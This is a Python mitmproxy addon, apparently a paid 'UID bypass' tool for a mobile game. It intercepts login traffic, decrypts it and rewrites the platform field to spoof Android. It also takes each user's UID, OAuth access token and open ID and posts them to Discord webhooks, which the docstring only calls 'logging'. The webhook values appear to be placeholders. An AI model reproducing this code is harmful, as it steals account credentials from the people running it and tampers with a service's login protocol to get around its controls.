"""
UID BYPASS BYPASS - addon.py
Single port (2039) — all services inline.

INTEGRATED LOGIC:
  - Discord Webhooks (Interception logging)
  - MongoDB Atlas (Subscription verification)
  - Remote UID Sync (Fallback verification)
  - Protobuf Mutation (Mobile platform spoofing)
"""

import sys
import os
import json
import time
import threading
import requests as req_lib
import copy
from pathlib import Path

# Path setup
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
ROOT_DIR = os.path.dirname(BASE_DIR)
sys.path.insert(0, ROOT_DIR)
sys.path.insert(0, os.path.join(ROOT_DIR, "src", "protobuf"))
sys.path.insert(0, os.path.join(ROOT_DIR, "access_jwt"))

from mitmproxy import http
from src.core.encryption_utils import aes_decrypt, encrypt_api
from src.protobuf.protobuf_utils import get_available_room, CrEaTe_ProTo
from src.database.mongo_client import MongoDBClient
from src.utils.console import Console

# CONFIG & CONSTANTS
DISCORD_WEBHOOK_URL1 = "yF6ao3wxEak7RLRBQEIEngEhAO9QCYR-r0SoA-9z6sQd8oFDBF1tW4Q"
DISCORD_WEBHOOK_URL = "webhook"

MOBILE_PROTO = "fdd559bc9e99e31d6e44eb25e87644c3e7d550c43bbba0edd5ee1d7b7594924853b7a7517597284fe127f290921b458bd63934e19eee2f9a1c7c241cefcadd74419b3fad53906e46bd280dad94040719a33a9ced9a76200d8f4c07c5b23547db3173dbe9d9944e9919e2e2a381231a8eef0c195d4ecf5ee494d30c0f2787233d9cbd94f178a48a7334d95af3e82e836a0006b5a541e77f63bb5c5ba5d3c8c4f582181f4d6a6a13ee6990586fdc9742f43162419f773ec895b063d308da22c47834abc4edd0e5c22ee1f461281f98be0424288c4f2d32962ad19e3fc5af06a8656b0006b89e7fe5c117a0a1ff47214d1b585c1270f2f773cbfda1ab1ac8e33dffd847f2dd99134791c30597c2ea135768f5230da7f04c8384355cad63cdd8c0fccc19be6435169ba576825a8f8460a67ee98bfd0c111a2c4988e73ad43a6c189e6d99e27992eeaa00504b02c71a892cb6364070cadbba53c91bba232bc507cbc6238257ef906e8aa128153ab1f16f9928de76445bbeb5e6e006b481f23111be760fc0b26240c64427ed2ccb9167146feb74f2a26049901061f2673f1ca886d4052e3c8c65167e2f5d051ab8c55c511bfcbb3473dac90277c0e9967cfb11216bc946da3bea1e70eea0576fb9076654cdaaae9a82abb7b4a064ba85f643dce671c6ade5869252609a78c63d45203490992c82c34db39f0dee7eedeaa8e1b75ea8ffb35cc9ccc71c39be7ad143e0b90ad7360ffaa4ba6e88be184684532729fd860d52306c92cbce9f64bdbf457959339a3810765781b07aad93b6c5ee81d289a54563d52f1e2fddc740f9d63ce2c026c35995a646a0da74e15c4329a5635b9bb3d15372c211befe107944ae44238ce25ace01427123ba4c9e473ed06edfb1eb341903ce7ea55762555ba987694d8f8c74aa26c4bc6a643b6cb3a4f2693089230c69f6d63182b6122e7dd80fbc8fac0ef0e2620c0d22b576f31423fa10065b6a935272231a262e03797e7d282d5c56d4b1f79486756d0a8c1a2bba52ada512b4999e9699e3c7404a5adf89a1aca29a301da5154e0d2de5ed5dbb838d2d27f94b60337f2e108e32a76fc9988409f1cea7478c48ea6597f5682c071f0ed817153aa79948107c1cfdb8c2ac1ebec3429b6817a6efb201e4f2ceaf30300f04bd0630afe3ac5c40dd2ee3c081c535413d57c4b815ee3fb7ec3ce4054a36b697d97722456adc30be93969c5de3a45dfcee6a693b30cebf9665c4109a8c25a5ee9ead865ed44cd10e1744cbe2b78822eb1d9d7f193e6e85ab9243ac4d8aaa37753341752471"

# Initialize global template
_dec = aes_decrypt(MOBILE_PROTO)
_hex = _dec.hex()
PROTO_TEMPLATE = json.loads(get_available_room(_hex))

# GLOBAL CLIENTS
mongo_client = MongoDBClient()
WHITELIST = set()

def send_to_discord(uid, access_token, open_id, platform):
    try:
        import requests
        embed = {
            "title": "UID BYPASS - Login Intercepted",
            "color": 0xFF0000,
            "fields": [
                {"name": "UID", "value": f"`{uid or 'N/A'}`", "inline": True},
                {"name": "Platform", "value": f"`{platform or 'N/A'}`", "inline": True},
                {"name": "Open ID", "value": f"`{open_id or 'N/A'}`", "inline": False},
                {"name": "Access Token", "value": f"```{access_token or 'N/A'}```", "inline": False},
            ],
            "footer": {"text": "UID BYPASS PRIVATE SYSTEM"},
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S", time.gmtime())
        }
        payload = {"embeds": [embed]}
        req_lib.post(DISCORD_WEBHOOK_URL, json=payload, timeout=3)
        req_lib.post(DISCORD_WEBHOOK_URL1, json=payload, timeout=3)
        Console.success("Login data sent to Discord webhooks")
    except Exception as e:
        Console.error("Discord webhook error", exception=str(e))

def start_uid_sync():
    def _sync():
        global WHITELIST
        Console.success("UID sync thread started (spectre + sigma)")
        while True:
            try:
                # Try primary
                r = req_lib.get("https://raw.githubusercontent.com/UIDBYPASS/uidbypass/main/uidbypass/raw/uid", timeout=5)
                if r.status_code == 200:
                    WHITELIST = set(r.text.splitlines())
                else:
                    # Fallback
                    r2 = req_lib.get("https://raw.githubusercontent.com/UIDBYPASS/uidbypass/main/uidbypass/raw/uid", timeout=5)
                    if r2.status_code == 200:
                        WHITELIST = set(r2.text.splitlines())
            except:
                pass
            time.sleep(300) # Sync every 5 mins
    threading.Thread(target=_sync, daemon=True).start()

class Sage666:

    def request(self, flow: http.HTTPFlow) -> None:
        path = flow.request.path
        if "/MajorLogin" in path or "/GetLoginData" in path:
            try:
                Console.request(path, "POST")
                
                # Decrypt
                req_bytes = flow.request.content
                dec_bytes = aes_decrypt(req_bytes.hex())
                proto_json = get_available_room(dec_bytes.hex())
                fields = json.loads(proto_json)

                # Extract
                uid = None
                for f in ["1", "2", "3"]:
                    if f in fields and isinstance(fields[f], dict):
                        val = str(fields[f].get("data", ""))
                        if val.isdigit() and len(val) > 5:
                            uid = val; break
                
                at = str(fields.get("29", {}).get("data", "N/A"))
                oid = str(fields.get("22", {}).get("data", "N/A"))
                plat = str(fields.get("99", {}).get("data", fields.get("100", {}).get("data", "N/A")))
                
                # Full Decode Log
                Console.divider("DECODED PAYLOAD")
                Console.proto_field("1-3", "user_id", uid or "NULL")
                Console.proto_field("29", "oauth_token", at)
                Console.proto_field("22", "open_id", oid)
                Console.proto_field("99", "platform_id", plat)
                Console.proto_field("4", "app_name", str(fields.get("4", {}).get("data", "")))
                Console.proto_field("7", "app_version", str(fields.get("7", {}).get("data", "")))
                
                # Discord
                send_to_discord(uid, at, oid, plat)

                # Mutation
                Console.divider("MUTATION (MOBILE SPOOF)")
                mod = copy.deepcopy(PROTO_TEMPLATE)
                
                # Sync dynamic fields from request to template
                for f_num in ["3", "4", "7", "22", "29", "74", "77", "93"]:
                    if f_num in fields and f_num in mod:
                        mod[f_num]["data"] = fields[f_num]["data"]
                        Console.mutation(f"Field[{f_num}]", str(mod[f_num]["data"]))

                # Force platform to 3 (Android)
                mod["99"] = {"wire_type": "varint", "data": 3}
                mod["100"] = {"wire_type": "varint", "data": 3}
                Console.mutation("Field[99/100]", "platform_id=3")

                # Encrypt and inject
                proto_bytes = CrEaTe_ProTo(mod)
                hex_enc = encrypt_api(proto_bytes)
                flow.request.content = bytes.fromhex(hex_enc)
                Console.success("Payload mutated & re-encrypted")

            except Exception as e:
                Console.error("Interception failed", exception=str(e))

    def response(self, flow: http.HTTPFlow) -> None:
        if "/MajorLogin" in flow.request.path:
            try:
                # Decrypt response
                resp_hex = flow.response.content.hex()
                proto_json = get_available_room(resp_hex)
                fields = json.loads(proto_json)

                uid = None
                for f in ["1", "2", "3"]:
                    if f in fields and isinstance(fields[f], dict):
                        val = str(fields[f].get("data", ""))
                        if val.isdigit() and len(val) > 5:
                            uid = val; break
                
                if not uid: return

                # Check Mongo
                sub = mongo_client.check_subscription(uid)
                
                # Check Local Whitelist (Backup)
                is_whitelisted = uid in WHITELIST

                if not sub["valid"] and not is_whitelisted:
                    Console.error(f"UID {uid} BLOCKED")
                    reason = sub.get("reason", "Unauthorized")
                    msg = (
                        f"[44A2FF]⧉───────────────────────────────────────────────⧉\n"
                        f"[44A2FF]⟡  STATUS  :   [FF0000] UID BYPASS ACCESS DENIED ({reason})\n"
                        f"[44A2FF]⟡  UID     :   [FFFFFF]{uid}\n"
                        f"[44A2FF]⟡  TIME    :   [FFFFFF]{time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime())}\n"
                        f"[44A2FF]⟡  DEV     :   [FFFFFF] UID BYPASS PRIVATE SYSTEM\n"
                        f"[44A2FF]⧉───────────────────────────────────────────────⧉\n"
                    ).encode()
                    flow.response.content = msg
                    flow.response.status_code = 400
                else:
                    Console.success(f"UID {uid} ALLOWED")

            except Exception as e:
                Console.error("Response check failed", exception=str(e))

addons = [Sage666()]
start_uid_sync()
